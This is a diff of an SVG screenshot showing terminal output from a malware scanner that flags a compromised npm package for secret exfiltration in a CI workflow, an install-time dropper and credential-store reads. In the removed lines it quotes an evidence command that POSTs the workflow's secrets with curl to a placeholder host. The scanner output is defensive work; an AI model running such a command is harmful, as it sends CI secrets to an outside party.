@@ -1,40 +1,38 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="808" height="818" viewBox="0 0 808 818" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace" font-size="13">
-<title>cordon-scanner — a compromised npm package</title>
-<rect width="808" height="818" rx="8" fill="#11141a"/>
-<path d="M0 8a8 8 0 0 1 8-8h792a8 8 0 0 1 8 8v26.0H0z" fill="#1b1f27"/>
+<svg xmlns="http://www.w3.org/2000/svg" width="925" height="530" viewBox="0 0 925 530" font-family="ui-monospace, SFMono-Regular, Menlo, Consolas, &quot;DejaVu Sans Mono&quot;, monospace" font-size="13">
+<title>cordon-scanner</title>
+<rect width="925" height="530" rx="8" fill="#11141a"/>
+<path d="M0 8a8 8 0 0 1 8-8h909a8 8 0 0 1 8 8v26.0H0z" fill="#1b1f27"/>
 <circle cx="18" cy="17" r="6" fill="#ff5f57"/>
 <circle cx="36" cy="17" r="6" fill="#febc2e"/>
 <circle cx="54" cy="17" r="6" fill="#28c840"/>
-<text x="404.0" y="21" fill="#6e7681" font-size="11" text-anchor="middle">cordon-scanner — a compromised npm package</text>
+<text x="462.5" y="21" fill="#6e7681" font-size="11" text-anchor="middle">cordon-scanner</text>
 <text y="61.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">$ cordon-scanner scan .</tspan></text>
-<text y="97.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">cordon 0.1.0 · rulepack 0.1.0 (114fbabb75bd9898)</tspan></text>
-<text y="133.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">CRITICAL MALWARE.CI.SECRET_EXFIL.001  risk 100/100</tspan></text>
-<text y="151.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  .github/workflows/release.yml:8:14</tspan></text>
-<text y="169.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  malicious · confidence high · detector config</tspan></text>
-<text y="205.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  This workflow renders the whole secret context into a command. Every</tspan></text>
-<text y="223.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  secret available to the job is materialised as a string at that point,</tspan></text>
-<text y="241.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  where it can be printed, sent anywhere, or written to an artefact. There</tspan></text>
-<text y="259.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  is no legitimate reason to serialise the entire context.</tspan></text>
-<text y="295.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  evidence  - run: curl -X POST -d &quot;${{ secret[redacted] }}&quot; https://collect.example.invalid</tspan></text>
-<text y="331.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  why       base 90 x 1.00 confidence = 90</tspan></text>
-<text y="349.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            install_time +15 (executes during install or build, as the user, before other controls)</tspan></text>
-<text y="367.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            credential_access +12 (reads environment or key material)</tspan></text>
-<text y="385.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            clamped -17 (raw score 117 clamped into 0-100)</tspan></text>
-<text y="403.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            total (clamped 0-100) = 100</tspan></text>
-<text y="439.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  fix       Reference individual secrets by name. If a step genuinely needs</tspan></text>
-<text y="457.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            several, pass each one explicitly so the set is visible in</tspan></text>
-<text y="475.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            review.</tspan></text>
-<text y="511.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">CRITICAL MALWARE.DROPPER.001  risk 100/100</tspan></text>
-<text y="529.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  scripts/setup.js:9:1</tspan></text>
-<text y="547.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  malicious · confidence high · detector capability</tspan></text>
-<text y="583.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  This install or build script retrieves content over the network and runs</tspan></text>
-<text y="601.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  it. What executes is whatever the remote host chooses to serve at install</tspan></text>
-<text y="619.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  time, so it is not pinned by the lockfile, not captured by review, and not</tspan></text>
-<text y="637.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  reproducible. The package that was audited and the code that runs are not</tspan></text>
-<text y="655.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  the same thing.</tspan></text>
-<text y="691.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  evidence  const os = require(&#x27;os&#x27;);</tspan></text>
-<text y="727.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">  why       base 90 x 1.00 confidence = 90</tspan></text>
-<text y="745.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            install_time +15 (executes during install or build, as the user, before other controls)</tspan></text>
-<text y="763.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">            credential_access +12 (reads environment or key material)</tspan></text>
-<text y="799.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">    ... 143 more lines</tspan></text>
+<text y="97.0" xml:space="preserve"><tspan x="18.0" fill="#6e7681">cordon 0.1.0 · rulepack 0.1.0 (a180c5ae6812f501)</tspan></text>
+<text y="151.0" xml:space="preserve"><tspan x="18.0" fill="#39c5cf" font-weight="bold">.github/workflows/release.yml</tspan><tspan x="259.8" fill="#6e7681">1 finding</tspan></text>
+<rect x="64.8" y="157.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="169.0" xml:space="preserve"><tspan x="25.8" fill="#6e7681">7:35</tspan><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This workflow renders the whole secret context into a command.  </tspan><tspan x="642.0" fill="#6e7681">MALWARE.CI.SECRET_EXFIL.001</tspan></text>
+<text y="205.0" xml:space="preserve"><tspan x="18.0" fill="#39c5cf" font-weight="bold">scripts/setup.js</tspan><tspan x="158.4" fill="#6e7681">6 findings</tspan></text>
+<rect x="64.8" y="211.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="223.0" xml:space="preserve"><tspan x="25.8" fill="#6e7681">4:59</tspan><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This install or build script reads credentials or the ...       </tspan><tspan x="642.0" fill="#6e7681">MALWARE.EXFIL.001</tspan></text>
+<rect x="64.8" y="229.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="241.0" xml:space="preserve"><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This file reads credentials or the environment, opens an ...    </tspan><tspan x="642.0" fill="#6e7681">SUSPECT.EXFIL.001</tspan></text>
+<rect x="64.8" y="247.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="259.0" xml:space="preserve"><tspan x="25.8" fill="#6e7681">7:1 </tspan><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This install or build script retrieves content over the ...     </tspan><tspan x="642.0" fill="#6e7681">MALWARE.DROPPER.001</tspan></text>
+<rect x="64.8" y="265.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="277.0" xml:space="preserve"><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  An install or build script reads a browser login ...            </tspan><tspan x="642.0" fill="#6e7681">MALWARE.EXFIL.CREDENTIAL_STORE.001</tspan></text>
+<rect x="64.8" y="283.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="295.0" xml:space="preserve"><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This file retrieves something over the network and ...          </tspan><tspan x="642.0" fill="#6e7681">SUSPECT.DROPPER.001</tspan></text>
+<rect x="64.8" y="301.0" width="62.4" height="18.0" rx="2" fill="#da3633"/>
+<text y="313.0" xml:space="preserve"><tspan x="64.8" fill="#f0f6fc" font-weight="bold">CRITICAL</tspan><tspan x="127.2" fill="#c9d1d9">  This file reads a browser&#x27;s saved-login database, an OS ...     </tspan><tspan x="642.0" fill="#6e7681">SUSPECT.EXFIL.CREDENTIAL_STORE.001</tspan></text>
+<text y="349.0" xml:space="preserve"><tspan x="18.0" fill="#39c5cf" font-weight="bold">package.json</tspan><tspan x="127.2" fill="#6e7681">1 finding</tspan></text>
+<rect x="64.8" y="355.0" width="62.4" height="18.0" rx="2" fill="#f85149"/>
+<text y="367.0" xml:space="preserve"><tspan x="25.8" fill="#6e7681">4:1 </tspan><tspan x="64.8" fill="#484f58" font-weight="bold">  HIGH  </tspan><tspan x="127.2" fill="#c9d1d9">  The &#x27;postinstall&#x27; script runs automatically during ...          </tspan><tspan x="642.0" fill="#6e7681">SUSPECT.INSTALL.SCRIPT.001</tspan></text>
+<text y="385.0" xml:space="preserve"><tspan x="18.0" fill="#6e7681">----------------------------------------------------------------------------</tspan></text>
+<rect x="18.0" y="391.0" width="93.6" height="18.0" rx="2" fill="#da3633"/>
+<rect x="135.0" y="391.0" width="62.4" height="18.0" rx="2" fill="#f85149"/>
+<text y="403.0" xml:space="preserve"><tspan x="18.0" fill="#f0f6fc" font-weight="bold"> 7 critical </tspan><tspan x="111.6" fill="#c9d1d9"> · </tspan><tspan x="135.0" fill="#484f58" font-weight="bold"> 1 high </tspan><tspan x="197.4" fill="#c9d1d9"> · </tspan><tspan x="220.8" fill="#6e7681">0 medium</tspan><tspan x="283.2" fill="#c9d1d9"> · </tspan><tspan x="306.6" fill="#6e7681">0 low</tspan></text>
+<text y="421.0" xml:space="preserve"><tspan x="18.0" fill="#6e7681">3 files · 14ms</tspan></text>
+<text y="439.0" xml:space="preserve"><tspan x="18.0" fill="#6e7681">scan complete</tspan></text>
+<text y="475.0" xml:space="preserve"><tspan x="18.0" fill="#6e7681">Run again with -v for the evidence, the score derivation and the fix for each finding.</tspan></text>
+<text y="511.0" xml:space="preserve"><tspan x="18.0" fill="#c9d1d9">FAILED: 8 finding(s) met the failure policy (highest: critical)</tspan></text>
 </svg>
